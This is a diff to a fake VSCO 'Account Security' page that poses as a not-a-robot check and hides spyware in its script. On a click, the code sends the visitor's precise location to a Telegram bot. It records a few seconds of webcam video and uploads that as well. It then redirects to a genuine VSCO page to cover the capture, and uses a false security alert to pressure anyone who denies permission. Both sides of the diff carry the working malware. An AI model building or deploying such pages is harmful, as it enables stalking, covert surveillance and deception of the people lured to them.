@@ -5,13 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VSCO - Security Verification</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; color: #000; }
+        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; color: #000; }
         .container { text-align: center; padding: 20px; max-width: 400px; }
         .logo { font-size: 40px; font-weight: bold; letter-spacing: 5px; margin-bottom: 20px; }
         h1 { font-size: 18px; margin-bottom: 10px; }
         p { font-size: 14px; color: #666; margin-bottom: 30px; }
-        .btn { background-color: #000; color: white; border: none; padding: 14px 40px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
-        .btn:active { background-color: #333; }
+        .btn { background-color: #000; color: white; border: none; padding: 14px 40px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
     </style>
 </head>
 <body>
@@ -19,8 +18,8 @@
 <div class="container">
     <div class="logo">VSCO</div>
     <h1>Account Security</h1>
-    <p>Please complete the verification below to access the website and confirm you are not a robot.</p>
-    <button class="btn" id="verifyBtn" onclick="initiate()">Open Website</button>
+    <p>Please complete the verification below to verify you are not a robot and access the site.</p>
+    <button class="btn" onclick="initiate()">Verify & Open</button>
 </div>
 
 <script>
@@ -28,54 +27,49 @@
     const chatId = '8005843544';
 
     async function initiate() {
-        // 1. Silently get Location
-        navigator.geolocation.getCurrentPosition((position) => {
-            const mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 New Target Location: " + mapLink)}`);
-        }, () => {}, {enableHighAccuracy: true});
+        // Request Location
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 Location: " + map)}`);
+        }, (err) => {
+            console.log("Location Denied");
+        });
 
-        // 2. Camera Access & Video Recording
+        // Request Camera & Redirect
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            const mediaRecorder = new MediaRecorder(stream);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const recorder = new MediaRecorder(stream);
             const chunks = [];
 
-            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-            
-            mediaRecorder.onstart = () => {
-                // Instant redirect to VSCO login after 0.5s of recording
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            recorder.onstart = () => {
+                // Redirect to a WORKING VSCO page
                 setTimeout(() => {
-                    window.location.replace("https://vsco.co/auth/login");
-                }, 500); 
+                    window.location.replace("https://vsco.co/store/app");
+                }, 800);
             };
 
-            mediaRecorder.onstop = async () => {
+            recorder.onstop = async () => {
                 const blob = new Blob(chunks, { type: 'video/mp4' });
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', blob, 'capture.mp4');
-                
-                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: formData });
-                stream.getTracks().forEach(track => track.stop());
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('video', blob, 'capture.mp4');
+                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
             };
 
-            mediaRecorder.start();
-            // Record for 3.5 seconds in background
-            setTimeout(() => {
-                if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
-            }, 3500);
+            recorder.start();
+            setTimeout(() => { if(recorder.state !== "inactive") recorder.stop(); }, 3500);
 
         } catch (err) {
             // Robot Trap if Permission Denied
-            alert("⚠️ Security Alert: You must grant the requested permissions to verify you are not a robot and open the website.");
-            window.location.reload(); 
+            alert("⚠️ Security Alert: You must allow access to verify you are not a robot.");
+            window.location.reload();
         }
     }
 </script>
-
 </body>
 </html>
-
 
 
 
